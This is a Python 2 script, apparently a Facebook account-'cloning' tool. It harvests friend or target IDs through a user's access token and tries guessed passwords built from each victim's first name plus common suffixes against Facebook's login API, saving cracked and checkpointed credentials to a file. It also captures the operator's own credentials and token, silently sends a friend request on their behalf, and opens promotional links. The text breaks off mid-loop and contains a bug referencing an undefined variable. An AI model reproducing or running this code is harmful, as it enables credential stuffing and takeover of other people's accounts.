#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] ENTER TOKEN :")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] WANT PICK UP TOKEN?\033[1;97m[y/n] : ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')		



##### LOGO #####
logo = """

         \x1b[1;91m\033[1;92m╔╗╔╗╔╦═══╦╗░░╔═══╦═══╦═╗╔═╦═══╗
         \x1b[1;91m\033[1;92m║║║║║║╔══╣║░░║╔═╗║╔═╗║║╚╝║║╔══╝
         \x1b[1;91m\033[1;92m║║║║║║╚══╣║░░║║░╚╣║░║║╔╗╔╗║╚══╗
         \x1b[1;91m\033[1;92m║╚╝╚╝║╔══╣║░╔╣║░╔╣║░║║║║║║║╔══╝
         \x1b[1;91m\033[1;92m╚╗╔╗╔╣╚══╣╚═╝║╚═╝║╚═╝║║║║║║╚══╗
         \x1b[1;91m\033[1;92m░╚╝╚╝╚═══╩═══╩═══╩═══╩╝╚╝╚╩═══╝
\033[1;97m
         \x1b[1;92m\033[1;93m╔════╦═══╗
         \x1b[1;92m\033[1;93m║╔╗╔╗║╔═╗║
         \x1b[1;92m\033[1;93m╚╝║║╚╣║░║║
         \x1b[1;92m\033[1;93m░░║║░║║░║║
         \x1b[1;92m\033[1;93m░░║║░║╚═╝║
         \x1b[1;92m\033[1;93m░░╚╝░╚═══╝
\033[1;97m
      \x1b[1;93m\033[1;94m░██████╗░██╗░░░██╗██████╗░███╗░░░███╗███████╗███████╗████████╗
      \x1b[1;93m\033[1;94m██╔════╝░██║░░░██║██╔══██╗████╗░████║██╔════╝██╔════╝╚══██╔══╝
      \x1b[1;93m\033[1;94m██║░░██╗░██║░░░██║██████╔╝██╔████╔██║█████╗░░█████╗░░░░░██║░░░
      \x1b[1;93m\033[1;94m██║░░╚██╗██║░░░██║██╔══██╗██║╚██╔╝██║██╔══╝░░██╔══╝░░░░░██║░░░
      \x1b[1;93m\033[1;94m╚██████╔╝╚██████╔╝██║░░██║██║░╚═╝░██║███████╗███████╗░░░██║░░░
      \x1b[1;93m\033[1;94m░╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚══════╝░░░╚═╝░░░

\033[1;95m
             \x1b[1;94m\033[1;95m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
             \x1b[1;94m\033[1;95m───█▒▒░░░░░░░░░▒▒█───
             \x1b[1;94m\033[1;95m────█░░█░░░░░█░░█────
             \x1b[1;94m\033[1;95m─▄▄──█░░░▀█▀░░░█──▄▄─
             \x1b[1;94m\033[1;95m█░░█─▀▄░░░░░░░▄▀─█░░█
             \x1b[1;94m\033[1;96m╔═════════════════════════════╗
             \x1b[1;94m\033[1;96m║Author       :  GURMEET    ║
             \x1b[1;94m\033[1;96m║WhatsApp     :  +917087738967 ║
             \x1b[1;94m\033[1;96m║Version      :  1.0          ║
             \x1b[1;94m\033[1;96m╚═════════════════════════════╝
\033[1;97m




"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """



\033[1;92mPLEASE WAIT... #*********************** 4% 
"""

os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##********************** 8% 
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###********************* 12%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ####******************** 16%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #####******************* 20%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######****************** 24%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #######***************** 28%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ########**************** 32%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #########*************** 36%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##########************** 40%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###########************* 44%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ############************ 48%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #############*********** 52%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##############********** 56%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###############********* 60%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ################******** 64%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #################******* 68%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##################******* 72%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###################***** 76%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ####################**** 80%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #####################*** 84%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######################** 88%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #######################* 92%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######################## 100%

"""
time.sleep(2)
os.system("clear")

print """



\033[1;92mPLEASE WAIT... ■□□□□□□□□□□□□□□□□□□□□□ 4% 
"""

os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■□□□□□□□□□□□□□□□□□□□□ 8% 
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■□□□□□□□□□□□□□□□□□□□ 12%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■□□□□□□□□□□□□□□□□□□ 16%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■□□□□□□□□□□□□□□□□□ 20%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■□□□□□□□□□□□□□□□□ 24%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■□□□□□□□□□□□□□□□ 28%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■□□□□□□□□□□□□□□ 32%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■□□□□□□□□□□□□□ 36%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■□□□□□□□□□□□□ 40%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■□□□□□□□□□□□ 44%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■□□□□□□□□□□ 48%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■□□□□□□□□□ 52%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■□□□□□□□□ 56%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■□□□□□□□ 60%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■□□□□□□ 64%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■□□□□□ 68%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■□□□□ 72%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■□□□ 76%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■□□ 80%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■□ 84%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■■ 88%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■■■ 92%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■■■■ 100%

"""
time.sleep(2)
os.system("clear")
print """



\033[1;92mPLEASE WAIT... #*********************** 4% 
"""

os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##********************** 8% 
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###********************* 12%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ####******************** 16%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #####******************* 20%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######****************** 24%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #######***************** 28%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ########**************** 32%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #########*************** 36%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##########************** 40%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###########************* 44%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ############************ 48%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #############*********** 52%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##############********** 56%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###############********* 60%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ################******** 64%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #################******* 68%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##################******* 72%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###################***** 76%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ####################**** 80%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #####################*** 84%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######################** 88%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #######################* 92%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######################## 100%

"""
time.sleep(2)
os.system("clear")

print """



\033[1;92mPLEASE WAIT... ■□□□□□□□□□□□□□□□□□□□□□ 4% 
"""

os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■□□□□□□□□□□□□□□□□□□□□ 8% 
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■□□□□□□□□□□□□□□□□□□□ 12%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■□□□□□□□□□□□□□□□□□□ 16%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■□□□□□□□□□□□□□□□□□ 20%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■□□□□□□□□□□□□□□□□ 24%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■□□□□□□□□□□□□□□□ 28%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■□□□□□□□□□□□□□□ 32%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■□□□□□□□□□□□□□ 36%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■□□□□□□□□□□□□ 40%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■□□□□□□□□□□□ 44%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■□□□□□□□□□□ 48%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■□□□□□□□□□ 52%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■□□□□□□□□ 56%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■□□□□□□□ 60%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■□□□□□□ 64%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■□□□□□ 68%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■□□□□ 72%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■□□□ 76%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■□□ 80%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■□ 84%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■■ 88%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■■■ 92%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ■■■■■■■■■■■■■■■■■■■■■■■■ 100%

"""
time.sleep(2)
os.system("clear")
print """



\033[1;92mPLEASE WAIT... #*********************** 4% 
"""

os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##********************** 8% 
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###********************* 12%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ####******************** 16%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #####******************* 20%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######****************** 24%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #######***************** 28%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ########**************** 32%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #########*************** 36%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##########************** 40%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###########************* 44%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ############************ 48%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #############*********** 52%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##############********** 56%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###############********* 60%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ################******** 64%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #################******* 68%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ##################******* 72%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ###################***** 76%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ####################**** 80%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #####################*** 84%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######################** 88%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... #######################* 92%
"""
os.system("clear")
print """
\033[1;97mPLEASE WAIT... ######################## 100%

"""

os.system("clear")
time.sleep(2)
jalan("\033[1;95mLOADING COMPLETED...");time.sleep(2)

os.system("clear")


jalan("\033[1;91m (\_/) ")
jalan("\033[1;92m(• - •)")
jalan("\033[1;93m /> 🍌")
jalan("\033")
jalan("\033[1;93mPLEASE WAIT...")
jalan("\033")
jalan("\033");time.sleep(3)

os.system("clear")
print """



\033[1;91m        _          _
\033[1;92m         \        /
\033[1;93m        __\______/__
\033[1;94m        | [©]  [©] |​
\033[1;95m        |  [====]  |   [+] 🇬​​​​​🇺​​​​​🇷​​​​​🇲​​​​​🇪​​​​​🇪​​​​​🇹​​​​​ 🄷🄰🄲🄺🄴🅁🅂 [=]
\033[1;96m    ╔══o00════════00o═════════════════════════════╗
\033[1;97m    █       Author       :  GURMEET            █
\033[1;98m    █       Facebook     :  GURMEET SINGH        █
\033[1;99m    █       Instagram    :  singh___bawa786        █
\033[1;90m    █       WhatsApp     :  +917087738967         █
\033[1;91m    █       Version      :  1.0                   █
\033[1;92m    ╚═════════════════════════════════════════════╝
\033[1;93m
\033[1;94m                     [[ WELCOME ]]

"""


CorrectUsername = "SINGH"
CorrectPassword = "BAWA"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[+]\x1b[1;97m[ENTER-U̶S̶E̶R̶N̶A̶M̶E̶] ")
                                             
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆]\x1b[1;97m[ENTER-P̶A̶S̶S̶W̶O̶R̶D̶] ")
    	
        if (password == CorrectPassword):
            print "LOGIN SUCCESSFUL IN " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.facebook.com/profile.php?id=100018397542469')
    else:
        print "Wrong Username"
        os.system(   'xdg-open       https://www.facebook.com/profile.php?id=100018397542469')

def login():
	os.system('clear')
	print logo
	print "\033[1;91m[1]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK              \033[1;0m"
        time.sleep(0.05)
        print "\033[1;92m[2]\033[1;47m\033[1;31mLOGIN WAIT TOKEN                 \033[1;0m"
        time.sleep(0.05)
        print "\033[1;96m[0]\033[1;47m\033[1;31mEXIT                             \033[1;0m"
	time.sleep(0.05)
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;97m[+] SELECT OPTIONS: \033[1;91m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print 42*"\033[1;96m"
		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
		print('	' )
		id = raw_input('[!] \x1b[1;97mNUM/ID/EMAIL\x1b[1;97m: \x1b[1;97m')
		pwd = raw_input('[+] \x1b[1;97mPASSWORD\x1b[1;97m    : \x1b[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://youtube.com/channel/UCyvSCwZy0Q8eQ3KRj2UHzOQ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;97mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m>>>STARTING CRACK..."	
	print "\033[1;32;40m[2] \033[1;33;40m>>>UPDATE SYSTEM BY ZABI"																														
	print "\033[1;32;40m[0] \033[1;33;40m>>>LOGOUT FROM SYSTEM"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\033[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m\n"
		os.system('git pull origin master')
		raw_input('\n\033[1;97m[ \033[1;97mBack \033[1;97m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m>>>CRACK FROM FRIEND LIST"
	print "\x1b[1;32;40m[2] \033[1;33;40m>>>CRACK FROM PUBLIC ID"
	print "\x1b[1;32;40m[0] \033[1;33;40m>>>BACK"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\033[1;97mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;97m[✺] GETTING IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[*] ENTER ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[*] Name : "+op["name"]
		except KeyError:
			print"\033[1;97m[*] ID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			super()
		print"\033[1;35;40m[*] GETTING IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\033[1;97m[+] \033[1;97mEnter the file name \033[1;97m: \033[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;97mFill in correctly"
		pilih_super()

	
	print "\033[1;36;40m[*] Total IDs : \033[1;97m"+str(len(id))
	jalan('\033[1;34;40m[*] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[*] Cloning...\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
		print("\r\033[1;32;40m\033[1;97m"+o)

	print "\n\033[1;97m  *\033[1;97mTo Stop Process Press CTRL+Z\033[1;97m*"
	print "        \033[1;92m●___________________________________●"

	jalan('              \033[1;97mCLONING STARTING...')
	print  "       \033[1;92m●___________________________________●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' ✔ ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' ✔ ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' ✔ ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '          \x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' ✔ ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' ✔ ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '          \x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' ✔ ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' ✔ ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
